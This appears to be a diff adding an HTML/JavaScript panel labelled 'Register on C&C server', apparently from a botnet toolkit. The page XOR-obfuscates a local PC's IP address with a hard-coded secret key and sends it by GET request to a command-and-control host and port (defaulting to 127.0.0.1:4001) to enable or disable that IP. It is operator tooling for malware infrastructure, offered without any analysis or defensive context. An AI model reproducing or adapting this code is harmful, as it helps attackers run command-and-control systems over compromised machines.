@@ -1,0 +1,135 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+<STYLE type="text/css">
+input {font-family: Arial, Verdana,  Helvetica, sans-serif; font-size: 80%;color: #000000}
+select {font-family: Arial, Verdana,  Helvetica, sans-serif; font-size: 80%; color: #000000}
+th {font-family: Arial, Verdana,  Helvetica, sans-serif;font-weight:bold; font-size: 90%; color: #000000;text-align:center;background-color: #6699CC}
+td {font-family: Arial, Verdana,  Helvetica, sans-serif; font-size: 80%; color: #000000;text-align:center;background-color: #F5F5DC}
+</STYLE>
+<SCRIPT language='JavaScript'>
+<!--
+var cchost="127.0.0.1";
+var ccport="4001";
+var secretkey="6389D1622BD67A17BE5A";
+function addto(f)
+{
+var coder="";
+var coder1="";
+var digit1;
+var digit2;
+var digit3;
+var rnd=Math.round(Math.random()*secretkey.length);
+coder+=rnd+",";
+coder1="1";
+if(rnd<100)coder1+="0";
+if(rnd<10)coder1+="0";
+coder1+=rnd;
+for(i=0;i<f.elements[2].value.length;i++)
+	{
+	digit1=parseInt(f.elements[2].value.substring(i,i+1),10);
+	if(isNaN(digit1))digit1=15;
+	digit2=parseInt(secretkey.substring(rnd,rnd+1),16);
+	rnd+=1;
+	if(rnd==secretkey.length)rnd=0;
+	coder+=digit1+":";
+	coder+=digit2+",";
+	digit3=digit1^digit2;
+	if(digit3<10)coder1+="0"+digit3;
+	else coder1+=digit3;
+	}
+f.action=f.action="http://"+f.elements[0].value+":"+f.elements[1].value+"/"+coder1;
+if(document.bgColor=="#7f7f7f")return;
+document.bgColor="#7F7F7F";
+f.submit();
+	}
+function removefrom(f)
+{
+var coder="";
+var coder1="";
+var digit1;
+var digit2;
+var digit3;
+var rnd=Math.round(Math.random()*secretkey.length);
+coder+=rnd+",";
+coder1="0";
+if(rnd<100)coder1+="0";
+if(rnd<10)coder1+="0";
+coder1+=rnd;
+for(i=0;i<f.elements[2].value.length;i++)
+	{
+	digit1=parseInt(f.elements[2].value.substring(i,i+1),10);
+	if(isNaN(digit1))digit1=15;
+	digit2=parseInt(secretkey.substring(rnd,rnd+1),16);
+	rnd+=1;
+	if(rnd==secretkey.length)rnd=0;
+	coder+=digit1+":";
+	coder+=digit2+",";
+	digit3=digit1^digit2;
+	if(digit3<10)coder1+="0"+digit3;
+	else coder1+=digit3;
+	}
+
+f.action=f.action="http://"+f.elements[0].value+":"+f.elements[1].value+"/"+coder1;
+if(document.bgColor=="#7f7f7f")return;
+document.bgColor="#7F7F7F";
+f.submit();
+}
+function init_form(f)
+{
+f.elements[0].value=""+cchost;
+f.elements[1].value=""+ccport;
+}
+//-->
+</SCRIPT>
+</HEAD>
+<BODY BGCOLOR="#F5F5DC" MARGINHEIGHT="0" MARGINWIDTH="0" LEFTMARGIN="0" TOPMARGIN="0" BORDER="0" TEXT="#000000" LINK="#000000" ALINK="#000000" VLINK="#000000">
+<FORM NAME='REGISTRATION' METHOD="GET" ACTION="">
+<table width='100%' border='1' cellspacing='0' cellpadding='0' align='center'>
+<TR>
+<TH>
+Register on C&C server:
+</TH>
+</TR>
+</TABLE>
+<BR>
+<table width='100%' border='1' cellspacing='0' cellpadding='0' align='center'>
+<TR>
+<TH>
+C&C host IP number 
+</TH>
+<TH>
+C&C port number
+</TH>
+<TH>
+Local PC IP number
+</TH>
+<TH>
+Action
+</TH>
+</TR>
+<TR>
+<TD>
+<INPUT TYPE=TEXT VALUE="">
+</TD>
+<TD>
+<INPUT TYPE=TEXT VALUE="">
+</TD>
+<TD>
+<INPUT TYPE=TEXT VALUE="">
+</TD>
+<TD>
+<INPUT TYPE=BUTTON VALUE="Enable IP"  onclick="addto(this.form)">
+<INPUT TYPE=BUTTON VALUE="Disable IP" onclick="removefrom(this.form)">
+</TD>
+</TR>
+</TABLE>
+</FORM>
+<SCRIPT>
+<!--
+init_form(document.forms['REGISTRATION']);
+//-->
+</SCRIPT>
+<!-- CHANGES AT 05.04.2006 //-->
+</BODY>
+</HTML>
